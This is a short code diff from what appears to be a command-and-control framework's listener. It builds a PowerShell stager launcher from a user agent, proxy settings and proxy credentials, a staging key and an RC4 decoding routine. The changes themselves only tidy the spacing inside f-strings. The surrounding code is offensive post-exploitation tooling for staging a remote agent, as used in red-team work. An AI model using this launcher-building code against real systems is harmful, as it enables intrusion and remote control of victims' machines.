@@ -226,7 +226,7 @@ class Listener:
             if user_agent.lower() == "default":
                 profile = listener_options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
-            launcher += f"$u='{ user_agent }';"
+            launcher += f"$u='{user_agent}';"
 
             if user_agent.lower() != "none" or proxy.lower() != "none":
                 if user_agent.lower() != "none":
@@ -240,7 +240,7 @@ class Listener:
 
                     else:
                         launcher += "$proxy=New-Object Net.WebProxy;"
-                        launcher += f"$proxy.Address = '{ proxy.lower() }';"
+                        launcher += f"$proxy.Address = '{proxy.lower()}';"
                         launcher += "$wc.Proxy = $proxy;"
 
                 if proxy_creds.lower() == "default":
@@ -251,13 +251,13 @@ class Listener:
                     password = proxy_creds.split(":")[1]
                     domain = username.split("\\")[0]
                     usr = username.split("\\")[1]
-                    launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                    launcher += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                     launcher += "$wc.Proxy.Credentials = $netcred;"
 
                 launcher += "$Script:Proxy = $wc.Proxy;"
 
             # code to turn the key string into a byte array
-            launcher += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            launcher += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
             # this is the minimized RC4 launcher code from rc4.ps1
             launcher += listener_util.powershell_rc4()
